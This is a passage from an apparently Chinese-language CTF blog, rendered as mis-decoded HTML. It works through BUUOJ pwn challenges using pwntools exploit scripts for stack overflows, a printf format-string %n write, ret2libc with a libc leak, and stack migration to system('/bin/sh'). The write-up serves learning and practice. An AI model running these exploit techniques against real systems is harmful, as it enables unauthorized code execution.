class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;name:\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br>back_door = <span class="hljs-number">0x400726</span> <br>p.recvuntil(<span class="hljs-string">b&#x27;name?\n&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p64(back_door)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h1><p>32ä½åŠ¨æ€é“¾æ¥ç¨‹åºã€‚</p><p>checksecäº†ä¸€ä¸‹ï¼Œååˆ†æ„ŸåŠ¨ï¼Œåšäº†ä¸€å‘¨ç»ˆäºè§åˆ°æœ‰<code>stack cananry</code>çš„é¢˜ç›®äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>æ”¾åˆ°<code>IDA</code>é‡Œçœ‹ä¸€ä¸‹<br><img src="/images/20250819170420.png"><br>å¾€<code>buf</code>é‡Œé¢è¾“å…¥å†…å®¹ï¼Œç„¶åè¾“å‡ºè¾“å…¥çš„å†…å®¹ï¼Œå¹¶ä¸”è¾“å‡ºxï¼Œxæ˜¯å·²ç»ç»™å®šçš„å€¼ï¼Œé‚£å°±<code>read</code>æ¥ROPåŠ«æŒåˆ°<code>if</code>å—å†…éƒ¨å§ï¼Œå…ˆæå®š<code>canary</code><img src="/images/20250819170734.png"><br>å¯ä»¥çœ‹åˆ°canaryåœ¨<code>buf + 0x50</code>çš„ä½ç½®ï¼Œé€‰æ‹©å°†æœ€ä½ä½<code>\x00</code>è¦†ç›–ä»¥å…¨éƒ¨æ‰“å°çš„æ–¹å¼ï¼Œä»è€Œæ³„éœ²<code>canary</code>ï¼Œ<del>ç„¶åå†é‡æ–°åŠ«æŒå³å¯ã€‚</del><br>ä¸å¯¹ï¼Œè¿™é‡Œå‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œç¨‹åºåªä¼šèµ°ä¸€éã€‚å¦‚æœä¸è¦†ç›–canaryæ²¡æ³•å†æ¬¡è¯»ä»è€Œè¿›è¡ŒROPåŠ«æŒäº†ï¼Œå¹¶ä¸”<code>read(0, buf, 0x50</code>ï¼Œé•¿åº¦ä¸å¤Ÿï¼Œæ˜¯ä¸å…è®¸ROPçš„ã€‚ä½†æ˜¯æ˜¯<code>printf</code>ï¼Œè€ƒè™‘æ ¼å¼åŒ–å­—ç¬¦ä¸²å§ï¼Œä½†æ˜¯æ²¡å­¦è¿‡ï¼Œç°å­¦ä¸€ä¸‹ï¼ˆç¬‘ï¼‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:27020&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>x_addr=<span class="hljs-number">0x0804A02C</span><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># payload=b&quot;aaaa%12$n&quot; + p32(x_addr)</span><br>payload=<span class="hljs-string">b&quot;%4c%13$n&quot;</span> + p32(x_addr)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>è¦å…ˆè¯•å‡ºæ¥printfç¬¬ä¸€ä¸ªå¯æ‰“å°å‚æ•°çš„ä½ç½®ï¼Œæ–¹å¼ä¸ºï¼š<br><img src="/images/20250820112254.png"><br>å¯ä»¥çœ‹åˆ°aaaaå†æ¬¡è¢«æ‰“å°çš„ä½ç½®ä¸ºç¬¬11ä¸ª%pï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªå‚æ•°çš„ä½ç½®æ˜¯11ï¼Œç„¶åè¦å¾€<code>x_addr</code>é‡Œå†™ï¼Œ<code>x_addr</code>æ˜¯ç¬¬13ä¸ªå‚æ•°ã€‚<br>ç”¨<code>%n</code>ï¼Œå†™å…¥å†…å®¹ä¸ºå·²æ‰“å°å­—ç¬¦çš„ä¸ªæ•°ã€‚</p><p>å¯ä»¥çœ‹åˆ°ä»£ç ä¸­æˆ‘æ³¨é‡Šæ‰äº†ä¸€ä¸ªpayloadï¼Œæˆ‘åˆšå¼€å§‹ç”¨çš„å°±æ˜¯ç¬¬ä¸€ä¸ªpayloadï¼Œç›´æ¥æ‰“å‡º4ä¸ªaæ¥è¡¨ç¤ºxé•¿åº¦ï¼Œä½†æ˜¯æ²¡æ‰“é€šï¼Œç„¶åè°ƒäº†ä¸€ä¸‹ï¼Œç¡®å®šxçš„å€¼æ˜¯åœ¨ä¸‹é¢çš„å†…å®¹ä¸­è¢«æ›´æ”¹äº†ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0xf7db3ab4 &lt;<span class="hljs-built_in">printf</span>+36&gt;    call   __vfprintf_internal         &lt;__vfprintf_internal&gt;<br></code></pre></td></tr></table></figure><p>é‡Œé¢å…·ä½“å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ<br>ä¸€æ­¥ä¸€æ­¥è°ƒï¼Œå‘ç°æ˜¯è¿™ä¸ªå‡½æ•°è§¦å‘äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">printf_positional<br></code></pre></td></tr></table></figure><p><img src="/images/20250820150937.png"><br>è¿™é‡Œæœ‰å¾ˆå¤šæ¬¡å¾ªç¯ï¼Œæ¯æ¬¡å¾ªç¯å¯¹<code>ebx</code>+1ï¼Œç„¶åå¯¹<code>edi</code>ä½œå¤„ç†<br><img src="/images/20250820151143.png"><br>å½“ebxå¾ªç¯åˆ°13çš„æ—¶å€™ï¼Œå¾ªç¯åº”è¯¥æ˜¯ç»“æŸäº†ï¼Œç„¶åå¼€å§‹ä¸€ç³»åˆ—å¥‡æ€ªçš„æ“ä½œï¼ˆæˆ‘æ²¡çœ‹æ‡‚XDï¼‰ï¼Œç´§æ¥ç€çªç„¶æœ‰ä¸€æ­¥ï¼š<br><img src="/images/20250820151654.png"><br>å¯ä»¥çœ‹åˆ°ç»™xèµ‹å€¼è¿™æ­¥å‡ºç°äº†ï¼Œç°åœ¨éœ€è¦é‡æ–°æ¥çœ‹ä»”ç»†çœ‹ä¸€ä¸‹åœ¨è¿™ä¹‹å‰éƒ½å‘ç”Ÿäº†ä»€ä¹ˆã€‚è¿›å…¥<code>printf_positional</code>åï¼Œç»™<code>*printf_positional+859</code>æ‰“æ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°ç¡®å®æ˜¯å¾ªç¯ï¼Œç›´åˆ°<code>ebx=13</code>ä¸ºæ­¢ï¼Œçœ‹ä¸Šå»å¾ˆåƒæˆ‘ä»¬ä¼ å…¥çš„<code>payload = b&quot;%4c%13$n&quot; + p32(x_addr)</code>ï¼Œç»™ç¬¬13ä¸ªå‚æ•°èµ‹å€¼ã€‚<br><img src="/images/20250820152359.png"><br>ç²˜å‡ºä¸Šé¢è¿™å¼ å›¾æ˜¯å› ä¸ºæˆ‘å‘ç°è¿™å¼ å›¾æˆ‘èƒ½çœ‹æ‡‚ï¼ˆbushi<br>eaxå·¦ç§»å››ä½ï¼Œç„¶åå»eax+ecxåœ°å€å¤„çš„å€¼å­˜å…¥eaxï¼Œå‘ç°ecx+eaxä¸å°±æ˜¯åˆšå¼€å§‹<code>printf</code>æ ˆä¸Šç¬¬13ä¸ªå‚æ•°å—ï¼ˆç»™xèµ‹å€¼ä¸º3çš„ï¼‰<br><img src="/images/20250820152641.png"><br>ç„¶åå°±åœ¨è¿™é‡Œæ°´çµçµçš„ç»™xèµ‹å€¼äº†ï¼ˆbushiï¼Œæˆ‘æ€ä¹ˆæ²¡æ³¨æ„åˆ°æ ˆé‡Œå•¥æ—¶å€™å¤šäº†ä¸ª4å•Šï¼Œ<code>ebp+0x10</code>çš„å€¼ä»€ä¹ˆæ—¶å€™å˜æˆ4äº†ï¼‰</p><p>æ‰¾åˆ°äº†ä¸€ç¯‡æ¯”è¾ƒå¥½çš„æ–‡ç« æè¿°<a href="https://bbs.kanxue.com/thread-285054.htm#msg_header_h2_1">printf</a>å‡½æ•°çš„å†…éƒ¨æœºåˆ¶</p><p>libc æ˜¯&#x3D;&#x3D;GNU C Library&#x3D;&#x3D;çš„ç¼©å†™ï¼Œæ˜¯GNU å‘å¸ƒçš„C æ ‡å‡†åº“ï¼Œä¹Ÿæ˜¯Linux ç³»ç»Ÿä¸­æœ€å¸¸ç”¨çš„C è¯­è¨€è¿è¡Œæ—¶åº“(runtime library)ã€‚å®ƒä¸ºå¼€å‘äººå‘˜æä¾›äº†å¤§é‡çš„APIï¼ŒåŒ…æ‹¬ç³»ç»Ÿè°ƒç”¨å°è£…å’Œæ ‡å‡†C åº“å‡½æ•°ï¼Œæ˜¯è®¸å¤šç¨‹åºè¿è¡Œçš„åŸºç¡€ã€‚</p><p>GLibCé€šè¿‡<code>ldbl_strong_alias</code>å°†<code>printf</code>è®¾ç½®æˆäº†<code>__printf</code>çš„åˆ«åã€‚</p><p><code>ldbl_strong_alias</code>çš„å®ç°ä¾æ‰˜äºGCCçš„<code>__attribute__</code>å’Œ<code>alias</code>å…³é”®å­—å®ç°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _strong_alias(name, aliasname) \</span><br><span class="hljs-meta">    extern __typeof (name) aliasname __attribute__ ((alias (#name))) __attribute_copy__ (name);</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> strong_alias(name, aliasname) _strong_alias(name, aliasname)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ldbl_strong_alias(name, aliasname) strong_alias (name, aliasname)</span><br></code></pre></td></tr></table></figure><p>çœ‹ä¸‹<code>__printf</code>çš„å®šä¹‰ï¼Œå…¶ä¸­æœ‰æˆ‘ä»¬ä¹‹å‰ç¢°åˆ°çš„<code>__vfprintf_internal</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>__printf (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, ...)<br>&#123;<br>  va_list arg;<br>  <span class="hljs-type">int</span> done;<br>  va_start (arg, format);<br>  done = __vfprintf_internal (<span class="hljs-built_in">stdout</span>, format, arg, <span class="hljs-number">0</span>);<br>  va_end (arg);<br>  <span class="hljs-keyword">return</span> done;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±éƒ½å¯¹ä¸Šäº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">vfprintf</span><br>    -&gt; printf_positional<br>        -&gt; va_arg<br></code></pre></td></tr></table></figure><h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><p>64ä½ï¼ŒåŠ¨æ€é“¾æ¥ï¼Œchecksecç»“æœï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>ä»€ä¹ˆä¿æŠ¤éƒ½æ²¡å¼€ï¼Œé‰´å®šä¸ºç®€å•ROPï¼ˆç¬‘ï¼‰<br>æ²¡æœ‰åé—¨å‡½æ•°ä»¥åŠ<code>system</code>è¿™äº›ï¼Œè¿˜è¦<code>libc</code>æ³„æ¼XD </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:28760&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pop_rdi_ret = <span class="hljs-number">0x0000000000400733</span><br>vuln = <span class="hljs-number">0x000000000040067D</span><br><br><span class="hljs-comment">#-----æ³„éœ² libc-----#</span><br>p.recvuntil(<span class="hljs-string">b&#x27;story!\n&#x27;</span>)<br>payload=<span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x28</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(vuln)<br>p.sendline(payload)<br>puts_addr = u64(p.recvline()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>read_addr = u64(p.recvline()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;puts_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;read_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(read_addr)&#125;</span>&quot;</span>)<br>libc = puts_addr - <span class="hljs-number">0x6f690</span><br>system = libc + <span class="hljs-number">0x45390</span><br>bin_sh = libc + <span class="hljs-number">0x18cd57</span><br><br><span class="hljs-comment">#-----ROP-----#</span><br>p.recvuntil(<span class="hljs-string">b&#x27;story!\n&#x27;</span>)<br>payload = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x28</span> + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡äº”åˆ†é’Ÿç§’äº†ä¸€é“æ³„éœ²<code>libc</code>çš„é¢˜ç›®ï¼Œè®°å½•ä¸€ä¸‹</p><h1 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h1><p>64ä½åŠ¨æ€é“¾æ¥ç¨‹åº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      No RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>ä»€ä¹ˆä¿æŠ¤ä¹Ÿæ²¡å¼€ã€‚ç„¶åæœ‰<code>read</code>çš„æ ˆæº¢å‡ºï¼Œå¹¶ä¸”æœ‰åé—¨å‡½æ•°<code>good_game</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:27592&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;message:\n&#x27;</span>)<br>good_game = <span class="hljs-number">0x400620</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x88</span> + p64(good_game)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><p>^3e2b39</p><p>32ä½åŠ¨æ€é“¾æ¥ï¼Œä¹Ÿæ˜¯ä»€ä¹ˆä¿æŠ¤éƒ½æ²¡å¼€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>ROPåˆ°å‡½æ•°hackã€‚å¥½å§è¢«è€äº†ï¼ˆç¬‘ï¼‰ã€‚åº”è¯¥æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæƒ³åŠæ³•æ”¹æ‰system(â€œâ€)é‡Œé¢çš„å†…å®¹ä¸º<code>/bin/sh</code>ã€‚è¦†ç›–ä»»æ„åœ°å€ä¸ºå­—ç¬¦ä¸²ï¼Ÿï¼ˆï¼‰è¿™è¯¥æ€ä¹ˆæ”¹<br>ä¸ä¼šåšï¼Œçœ‹äº†ä¸‹wpçš„æ€è·¯ï¼ŒåŸæ¥æ˜¯<code>ret2text</code>+<code>stack_migration</code>ã€‚åˆæ¥è§¦åˆ°æ–°çš„çŸ¥è¯†äº†orzï¼Œçœ‹ä¸€ä¸‹æ ˆè¿ç§»æ€ä¹ˆåšå§ï½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:26066&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>hack = <span class="hljs-number">0x0804854B</span><br>command = <span class="hljs-number">0x080486C0</span><br>leave_ret = <span class="hljs-number">0x08048562</span><br>system_addr = <span class="hljs-number">0x08048400</span><br><span class="hljs-comment"># gdb.attach(p)</span><br>p.recvline()<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x27</span> + <span class="hljs-string">b&#x27;b&#x27;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;b&#x27;</span>)<br>ebp = u32(p.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;old_ebp: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(ebp)&#125;</span>&quot;</span>)<br>s = ebp-<span class="hljs-number">0x38</span><br>bin_sh = s + <span class="hljs-number">0x10</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(system_addr) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(bin_sh) + <span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>payload = payload.ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload = payload+ p32(s) + p32(leave_ret)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€é<code>read</code>è¦†ç›–æ‰<code>old_ebp</code>ä¹‹å‰çš„æ‰€æœ‰æ ˆç©ºé—´ï¼Œä½¿å¾—<code>printf</code>çš„æ—¶å€™å¯ä»¥å°†<code>old_ebp</code>çš„å€¼ä¹Ÿæ‰“å°å‡ºæ¥ï¼Œå†æ ¹æ®è°ƒè¯•è®¡ç®—å‡º<code>old_ebp</code>å’Œ<code>s</code>ä¹‹é—´çš„åœ°å€åç§»ã€‚ç„¶åå°±èƒ½å¤Ÿåœ¨ç¬¬äºŒæ¬¡<code>read</code>å‰å¾—åˆ°<code>s</code>çš„åœ°å€ã€‚ç”¨<code>s</code>çš„åœ°å€è¦†ç›–åŸ<code>old_ebp</code>çš„ä½ç½®ï¼Œé€šè¿‡ä¸ºäº†æ ˆè¿ç§»ï¼Œå°†<code>return_addr</code>è¦†ç›–ä¸º<code>leave_ret</code>çš„åœ°å€ã€‚è¿™æ ·å°±ä¼šæ‰§è¡Œä¸¤æ¬¡<code>leave; ret</code>ï¼Œ<code>leave</code>ç›¸å½“äº<code>mov ebp, esp; pop ebp</code>ã€‚<code>ret</code>å¼¹å‡ºå½“å‰æ ˆå¸§åˆ°<code>eip</code>ä»¥æ‰§è¡Œï¼Œå³ï¼š<code>pop eip</code></p><p>ä¸¤æ¬¡<code>leave; ret</code>å®ç°äº†<code>esp</code>å’Œ<code>ebp</code>çš„æ§åˆ¶ -&gt; æ§åˆ¶æ ˆçš„ä½ç½®ï¼Œå¹¶ä¸”æˆ‘ä»¬èƒ½å¤Ÿæå‰å¸ƒç½®æ ˆã€‚</p><h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>64ä½åŠ¨æ€é“¾æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>åªå¼€äº†NX</p><p><img src="/images/20250821093547.png"></p><p>å¯ä»¥çœ‹åˆ°ä¼šå°†å†™çš„æœ€åä¸€ä¸ªå­—ç¬¦ç»™æ”¹ä¸º0ï¼Œå¦‚æœåªROPåˆ°<code>return addr</code>ï¼Œä¼šæ”¹æ‰ï¼Œå¤šæ‰“ä¸€ä¸ªå­—ç¬¦å°±è¡Œ(çŒœæµ‹)ï¼ŒåŒæ 